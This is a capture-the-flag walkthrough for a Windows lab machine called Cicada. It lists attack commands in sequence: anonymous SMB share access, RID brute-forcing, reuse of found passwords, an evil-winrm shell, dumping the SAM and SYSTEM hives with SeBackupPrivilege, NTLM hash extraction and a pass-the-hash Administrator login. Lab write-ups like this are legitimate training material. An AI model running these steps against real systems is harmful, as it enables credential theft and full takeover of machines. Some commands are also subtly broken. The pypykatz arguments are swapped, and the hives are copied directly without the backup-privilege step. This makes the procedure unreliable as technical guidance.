# Cicada

```
Difficulty: Easy
Operating System: Windows
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
| :-- | :--- | :--- | :--- |
| 1 | `N/A` | **Nmap Scan & SMB Enumeration** | Performed initial enumeration using **Nmap** to discover open ports. Identified port `445` (SMB) was open. Used **`smbclient`** to access an unsecured share and found a file containing a default password for new employees. |
| 2 | `Michael.wrightson` | **RID Brute-Forcing** | Used **`enum4linux-ng`** to perform a RID brute-force attack on the target. This revealed the username `Michael.wrightson`. Used the default password found earlier to connect and enumerate other user accounts, which revealed the user `david`. |
| 3 | `emily.oscars` | **File Analysis & Password Discovery** | Connected to the SMB share with the `david` credentials. Discovered and downloaded a **backup script**. The script contained a plaintext password for a new user, `emily.oscars`. |
| 4 | `emily.oscars` | **Initial Shell Access** | Gained an initial shell on the system using **`evil-winrm`** with the discovered `emily.oscars` credentials. Located and retrieved the `user.txt` flag. |
| 5 | `Administrator` | **Privilege Escalation** | Enumerated the current user's privileges and found the `SeBackupPrivilege`. Used this privilege to download the `SAM` and `SYSTEM` registry hives. Extracted the **`Administrator` NTLM hash** using **`pypykatz`** and used it to log in with `evil-winrm` and get the `root.txt` flag. |

###  Initial Access

1.  **Nmap Scan & SMB Reconnaissance**:

      - Perform a targeted Nmap scan:
        ```bash
        nmap -sV -sC 10.10.11.35
        ```
      - Use `smbclient` to list the shares without credentials:
        ```bash
        smbclient -L 10.10.11.35
        ```
      - Connect to the "HR" share:
        ```bash
        smbclient //10.10.11.35/HR
        ```
      - Inside the share, download the file containing the password:
        ```bash
        smb: \> ls
        smb: \> get "new_hire_info.txt"
        ```

2.  **RID Brute Force & User Enumeration**:

      - Use `enum4linux-ng` to enumerate users:
        ```bash
        enum4linux-ng -u 'Michael.wrightson' -p 'CicadXXXXXXXXXXXXXXXXXXX' 10.10.11.35
        ```
      - This command will reveal other user accounts, including **david**.

3.  **Find a New Password**:

      - Connect to the SMB share again, this time with the username **david** and the discovered password:
        ```bash
        smbclient //10.10.11.35/david -U david
        ```
      - Password: `aRtXXXXXXXXXXX`
      - Explore the directories to find a backup script and download it:
        ```bash
        smb: \> ls
        smb: \> get "backup_script.ps1"
        ```
      - Examine the script to find the new credentials: `emily.oscars`:`Q!3XXXXXXXXXXXXXX`

4.  **Get the User Flag**:

      - Use `evil-winrm` to connect with the new credentials:
        ```bash
        evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3XXXXXXXXXXXXXX'
        ```
      - Once connected, find the `user.txt` file:
        ```powershell
        ls
        cat user.txt
        ```

###  Privilege Escalation

1.  **Exploit SeBackupPrivilege**:

      - In the `evil-winrm` session, run the following command to check your privileges:
        ```powershell
        whoami /all
        ```
      - This will confirm `SeBackupPrivilege` is enabled.

2.  **Extract Administrator Hash**:

      - Use `evil-winrm`'s built-in functionality to download the `SAM` and `SYSTEM` hives. First, navigate to the directory:
        ```powershell
        cd C:\Windows\System32\config\
        ```
      - Download the files to your local machine:
        ```powershell
        download SYSTEM
        download SAM
        ```
      - On your local machine, use `pypykatz` to extract the password hashes from the downloaded files. **Note**: You may need to install `pypykatz` first (`pip install pypykatz`).
        ```bash
        pypykatz lsa sam --sam SYSTEM --system SAM
        ```
      - This command will output the NTLM hash for the `Administrator` account.

3.  **Final Login & Root Flag**:

      - Use `evil-winrm` to perform a pass-the-hash attack with the Administrator hash. Replace `<ADMIN_HASH>` with the hash you extracted.
        ```bash
        evil-winrm -i 10.10.11.35 -u Administrator -H <ADMIN_HASH>
        ```
      - Once logged in as Administrator, locate and read the `root.txt` file:
        ```powershell
        ls C:\Users\Administrator
        cat C:\Users\Administrator\root.txt
        ```